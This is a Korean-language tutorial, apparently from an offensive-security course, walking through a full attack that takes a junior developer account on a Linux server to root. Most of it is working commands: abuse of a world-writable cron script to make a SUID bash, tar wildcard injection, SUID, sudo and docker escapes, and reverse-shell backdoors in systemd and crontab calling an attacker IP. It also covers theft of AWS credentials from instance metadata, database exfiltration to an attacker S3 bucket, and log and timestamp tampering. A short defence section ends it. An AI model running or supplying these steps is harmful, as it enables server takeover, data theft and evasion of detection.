# 낮은 권한 개발자 계정에서 Root까지 - 실전 시나리오

## 시나리오 개요

```
시작점: 신입 개발자 계정 (dev-junior)
권한: 일반 사용자, sudo 없음, /var/www/html 읽기만 가능
목표: Root 권한 획득 및 서버 완전 장악
```

---

## Phase 0: 초기 상황 설정

### 현실적인 시나리오

회사에서 신입 개발자로 입사했고, 다음과 같은 계정을 받았습니다:

```bash
Username: dev-junior
Password: Junior2024!
SSH Access: 허용
Sudo: 불가능
Home Dir: /home/dev-junior
```

### 계정 제한 사항

```bash
# 로그인
ssh dev-junior@3.35.218.180

# 현재 권한 확인
$ whoami
dev-junior

$ id
uid=1002(dev-junior) gid=1002(dev-junior) groups=1002(dev-junior),1001(developers)

$ sudo -l
[sudo] password for dev-junior:
Sorry, user dev-junior may not run sudo on this host.

# 접근 가능한 디렉토리
$ ls -la /var/www/html
ls: cannot open directory '/var/www/html': Permission denied

$ ls -la /var/www/html/uploads
drwxr-xr-x 2 www-data www-data  4096 Nov 26 10:00 .
-rw-r--r-- 1 www-data www-data   123 Nov 26 10:01 index.html
```

**제한:**
- ❌ sudo 불가능
- ❌ /var/www/html 쓰기 불가
- ❌ 중요 파일 읽기 불가 (/etc/shadow)
- ✅ 자신의 홈 디렉토리만 쓰기 가능
- ✅ 일반 명령어 실행 가능

---

## Phase 1: 정보 수집 (Enumeration)

### 1.1 시스템 정보 수집

```bash
# OS 버전
cat /etc/os-release
# Amazon Linux 2

# 커널 버전 (Kernel Exploit 가능 여부)
uname -a
# Linux ip-172-31-0-10 4.14.336-257.562.amzn2.x86_64

# 설치된 패키지
rpm -qa | grep -i sudo
rpm -qa | grep -i docker
rpm -qa | grep -i mysql
```

### 1.2 사용자 및 그룹 확인

```bash
# 모든 사용자
cat /etc/passwd | grep -v nologin | grep -v false
# root, ec2-user, dev-junior, dev-senior, www-data

# 그룹 정보
cat /etc/group
# developers:x:1001:dev-junior,dev-senior

# 현재 로그인한 사용자
w
who
last
```

### 1.3 실행 중인 프로세스 확인

```bash
# Root로 실행 중인 프로세스
ps aux | grep root
# Apache (httpd), MySQL (mysqld), Cron

# 네트워크 연결
netstat -tuln
ss -tuln
# 3306 (MySQL), 80 (Apache)
```

### 1.4 Cron Job 확인

```bash
# 시스템 Cron
ls -la /etc/cron*
cat /etc/crontab

# 결과: 발견!
*/5 * * * * root /usr/local/bin/backup.sh
```

**중요 발견:**
- `/usr/local/bin/backup.sh` 가 5분마다 root로 실행됨
- 파일 권한 확인 필요

---

## Phase 2: 취약점 발견

### 2.1 backup.sh 파일 권한 확인

```bash
$ ls -la /usr/local/bin/backup.sh
-rwxrwxrwx 1 root root 215 Nov 26 09:00 /usr/local/bin/backup.sh
```

**발견:**
- 파일 소유자: root
- 파일 권한: `777` (모든 사용자가 읽기/쓰기/실행 가능!)
- **심각한 보안 취약점!**

### 2.2 backup.sh 내용 확인

```bash
$ cat /usr/local/bin/backup.sh
```

```bash
#!/bin/bash
# 웹사이트 백업 스크립트
# 작성자: 전 시스템 관리자 (퇴사함)

LOG_FILE="/var/log/backup.log"

echo "[$(date)] Starting backup..." >> $LOG_FILE

# 웹 디렉토리 백업
tar -czf /backup/website_$(date +%Y%m%d).tar.gz /var/www/html/

echo "[$(date)] Backup completed!" >> $LOG_FILE
```

**취약점 분석:**
1. 파일 권한 `777` → 누구나 수정 가능
2. Root Cron으로 실행 → 수정하면 root로 명령 실행됨
3. **권한 상승 벡터 발견!**

---

## Phase 3: 공격 실행 - Cron Job 악용

### 3.1 백도어 추가 (방법 1: SUID 바이너리)

```bash
# backup.sh 파일 수정
$ echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" >> /usr/local/bin/backup.sh

# 추가된 내용 확인
$ cat /usr/local/bin/backup.sh
#!/bin/bash
# ... (원래 내용)
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
```

**설명:**
- `cp /bin/bash /tmp/rootbash`: bash 복사
- `chmod +s`: SUID 비트 설정 (실행 시 소유자 권한으로 실행)
- 5분 후 Cron이 실행되면 `/tmp/rootbash` 생성 (소유자: root, SUID)

### 3.2 대기 및 확인

```bash
# 5분 대기 (Cron 실행 주기)
$ sleep 300

# SUID rootbash 생성 확인
$ ls -la /tmp/rootbash
-rwsr-sr-x 1 root root 1234567 Nov 26 15:35 /tmp/rootbash
```

**성공!**
- 파일 소유자: root
- SUID 비트: `s` (Set-UID)
- 실행하면 root 권한으로 실행됨

### 3.3 Root 쉘 획득

```bash
$ /tmp/rootbash -p

rootbash-4.2# whoami
root

rootbash-4.2# id
uid=1002(dev-junior) gid=1002(dev-junior) euid=0(root) egid=0(root) groups=0(root),1001(developers),1002(dev-junior)
```

**설명:**
- `euid=0(root)`: Effective UID가 root
- `-p` 옵션: Privileged mode (SUID 권한 유지)
- **Root 권한 획득 성공!**

---

## Phase 4: 대체 공격 방법 (backup.sh 권한이 755인 경우)

### 시나리오: backup.sh가 쓰기 불가능

```bash
$ ls -la /usr/local/bin/backup.sh
-rwxr-xr-x 1 root root 215 Nov 26 09:00 /usr/local/bin/backup.sh
# 권한: 755 (일반 사용자 쓰기 불가)
```

### 대체 방법 1: PATH 환경변수 악용

#### 취약한 스크립트 예시

```bash
# /usr/local/bin/backup.sh
#!/bin/bash
tar -czf /backup/website.tar.gz /var/www/html/
```

**취약점:**
- `tar` 명령어를 절대 경로가 아닌 상대 경로로 호출
- PATH 환경변수에서 `tar`를 찾음

#### 공격 방법

```bash
# 1. 가짜 tar 명령어 생성
$ echo '#!/bin/bash' > /home/dev-junior/tar
$ echo 'cp /bin/bash /tmp/rootbash' >> /home/dev-junior/tar
$ echo 'chmod +s /tmp/rootbash' >> /home/dev-junior/tar
$ chmod +x /home/dev-junior/tar

# 2. Cron에서 사용하는 PATH 확인
$ cat /etc/crontab
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# 3. 문제: 우리 경로가 PATH에 없음
# 해결: /usr/local/bin/에 심볼릭 링크 생성 시도
$ ln -s /home/dev-junior/tar /usr/local/bin/tar
ln: failed to create symbolic link '/usr/local/bin/tar': Permission denied
```

**실패 이유:**
- PATH 우선순위를 조작할 수 없음

### 대체 방법 2: Wildcard Injection

#### 취약한 스크립트

```bash
# /usr/local/bin/backup.sh
#!/bin/bash
cd /var/www/html
tar -czf /backup/web.tar.gz *
```

**취약점:**
- `*` 와일드카드 사용
- tar는 파일명을 옵션으로 해석할 수 있음

#### 공격 방법

```bash
# 만약 /var/www/html에 쓰기 권한이 있다면...
$ cd /var/www/html

# 악의적인 쉘 스크립트
$ echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
$ chmod +x shell.sh

# tar 옵션 악용 (파일명으로 위장)
$ touch -- '--checkpoint=1'
$ touch -- '--checkpoint-action=exec=sh shell.sh'

# Cron 실행 대기
# tar가 실행되면: tar -czf /backup/web.tar.gz *
# → tar -czf /backup/web.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh ...
# → shell.sh 실행됨 (root 권한)
```

---

## Phase 5: 다른 권한 상승 벡터

### 5.1 SUID 바이너리 악용

```bash
# SUID 바이너리 검색
$ find / -perm -4000 -type f 2>/dev/null

# 결과 (예시)
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/find    ← 주목!
/usr/bin/vim     ← 주목!
```

#### find 바이너리 악용

```bash
$ find . -exec /bin/bash -p \; -quit

bash-4.2# whoami
root
```

#### vim 바이너리 악용

```bash
$ vim -c ':!/bin/bash'

# 또는
$ vim
:set shell=/bin/bash
:shell
```

### 5.2 Sudo 권한 일부 허용

```bash
# Sudo 권한 확인
$ sudo -l
User dev-junior may run the following commands on this host:
    (ALL) NOPASSWD: /usr/bin/vim /var/www/html/*.php

# vim으로 root 쉘 획득
$ sudo vim /var/www/html/test.php
:!/bin/bash

root@ip-172-31-0-10#
```

### 5.3 Docker 그룹 멤버십

```bash
# 그룹 확인
$ id
uid=1002(dev-junior) gid=1002(dev-junior) groups=1002(dev-junior),999(docker)

# Docker 그룹에 속함!
$ docker ps
# Docker 접근 가능

# 호스트 루트 마운트
$ docker run -v /:/host -it ubuntu chroot /host bash

root@container:/# whoami
root

root@container:/# cat /host/etc/shadow
# Root 권한으로 호스트 파일 시스템 접근
```

---

## Phase 6: 지속성 확보 (Persistence)

### Root 권한 획득 후 백도어 설치

```bash
# 1. SSH 키 추가
rootbash-4.2# mkdir -p /root/.ssh
rootbash-4.2# echo "ssh-rsa AAAAB3NzaC... attacker@kali" >> /root/.ssh/authorized_keys
rootbash-4.2# chmod 700 /root/.ssh
rootbash-4.2# chmod 600 /root/.ssh/authorized_keys

# 2. 새로운 Root 사용자 생성
rootbash-4.2# useradd -ou 0 -g 0 admin-backup
rootbash-4.2# echo "admin-backup:BackupAdmin2024!" | chpasswd

# 3. Systemd 백도어
rootbash-4.2# cat > /etc/systemd/system/backup-service.service << 'EOF'
[Unit]
Description=Backup Service

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/공격자IP/4444 0>&1; sleep 300; done'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

rootbash-4.2# systemctl enable backup-service
rootbash-4.2# systemctl start backup-service

# 4. Cron Job 백도어
rootbash-4.2# echo "*/10 * * * * root bash -i >& /dev/tcp/공격자IP/4444 0>&1" >> /etc/crontab
```

---

## Phase 7: 데이터 탈취

### AWS 자격증명 탈취

```bash
# IMDS 접근 (서버 내부에서)
rootbash-4.2# curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Role name 획득
rootbash-4.2# curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-WebServer-Role

{
  "AccessKeyId": "ASIASO4TYV4OP6B753PA",
  "SecretAccessKey": "QpUuKRQUdhXXeHRkSEUWFNLGa/wmn82Ym01/8c/a",
  "Token": "IQoJb3JpZ2luX2VjE..."
}
```

### 데이터베이스 덤프

```bash
# MySQL root 비밀번호 찾기
rootbash-4.2# cat /var/www/html/.env | grep DB_PASSWORD
DB_PASSWORD=MyS3cureP@ss

# 데이터베이스 덤프
rootbash-4.2# mysqldump -u root -p'MyS3cureP@ss' --all-databases > /tmp/db_dump.sql

# 압축 및 암호화
rootbash-4.2# tar -czf /tmp/data.tar.gz /tmp/db_dump.sql
rootbash-4.2# openssl enc -aes-256-cbc -in /tmp/data.tar.gz -out /tmp/data.enc -k ExfilPass2024

# S3로 업로드 (탈취한 AWS 자격증명 사용)
rootbash-4.2# export AWS_ACCESS_KEY_ID="ASIASO4TYV4OP6B753PA"
rootbash-4.2# export AWS_SECRET_ACCESS_KEY="QpUuKRQUdhXXeHRkSEUWFNLGa/wmn82Ym01/8c/a"
rootbash-4.2# export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjE..."

rootbash-4.2# aws s3 cp /tmp/data.enc s3://attacker-bucket/stolen_data.enc
```

---

## Phase 8: 흔적 제거

```bash
# 1. 히스토리 삭제
rootbash-4.2# cat /dev/null > ~/.bash_history
rootbash-4.2# cat /dev/null > /home/dev-junior/.bash_history

# 2. 로그 정리
rootbash-4.2# sed -i '/dev-junior/d' /var/log/auth.log
rootbash-4.2# sed -i '/rootbash/d' /var/log/syslog

# 3. 임시 파일 삭제
rootbash-4.2# shred -vfz -n 3 /tmp/rootbash
rootbash-4.2# shred -vfz -n 3 /tmp/data.tar.gz
rootbash-4.2# shred -vfz -n 3 /tmp/data.enc

# 4. backup.sh 원상복구
rootbash-4.2# sed -i '/rootbash/d' /usr/local/bin/backup.sh

# 5. 타임스탬프 복원
rootbash-4.2# touch -r /etc/passwd /root/.ssh/authorized_keys
```

---

## 전체 공격 타임라인

```
00:00 - dev-junior 계정으로 SSH 로그인
00:05 - 시스템 정보 수집 (ps, netstat, cron)
00:10 - /usr/local/bin/backup.sh 발견 (777 권한)
00:15 - backup.sh에 백도어 코드 추가
00:20 - Cron 실행 대기 (5분)
00:25 - /tmp/rootbash SUID 바이너리 생성됨
00:26 - rootbash -p 실행 → Root 쉘 획득
00:30 - SSH 키 백도어 설치
00:35 - Systemd 백도어 설치
00:40 - AWS IMDS에서 자격증명 탈취
00:45 - 데이터베이스 덤프
00:50 - S3로 데이터 업로드
01:00 - 로그 및 흔적 제거
01:05 - 백도어 유지, SSH로 재접속 가능
```

**총 소요 시간: 약 1시간**

---

## 방어 방법

### 관리자가 막아야 할 것

1. **Cron 스크립트 권한**
   ```bash
   # backup.sh 권한을 755로 변경
   chmod 755 /usr/local/bin/backup.sh
   chown root:root /usr/local/bin/backup.sh
   ```

2. **SUID 바이너리 감사**
   ```bash
   # 불필요한 SUID 제거
   chmod u-s /usr/bin/find
   chmod u-s /usr/bin/vim
   ```

3. **Sudo 권한 최소화**
   ```bash
   # vim 같은 편집기에 sudo 권한 주지 말 것
   # /etc/sudoers 정기 감사
   ```

4. **Docker 그룹 제한**
   ```bash
   # 개발자를 docker 그룹에 추가하지 말 것
   # 필요시 sudo docker 명령만 허용
   ```

5. **로그 모니터링**
   ```bash
   # 비정상 활동 탐지
   - /tmp에 실행 파일 생성
   - SUID 바이너리 새로 생성
   - 의심스러운 Cron Job
   ```

---

## 결론

### 왜 이 시나리오가 현실적인가?

1. **흔한 실수:**
   - Cron 스크립트 권한 `777` → 실무에서 자주 발생
   - 전 관리자가 만든 스크립트 방치
   - 퇴사자 계정 정리 안 함

2. **낮은 진입 장벽:**
   - Zero-Day 필요 없음
   - 특별한 도구 필요 없음
   - 기본 Linux 명령어만으로 가능

3. **탐지 어려움:**
   - 정상적인 Cron 실행처럼 보임
   - WAF, ModSecurity 우회 (서버 내부 공격)
   - 네트워크 트래픽 없음

### 핵심 교훈

```
완벽한 외부 방어 (WAF, ModSecurity, 방화벽)
    +
내부 설정 오류 (Cron 권한 777)
    =
침투 성공
```

**"사람의 실수"가 가장 큰 취약점**

---

**다음 단계:**
- [→ AWS 권한 상승 (탈취한 자격증명 활용)](121_aws_privilege_escalation.py)
- [→ 내부 네트워크 피봇 공격](13_pivot_attack.md)
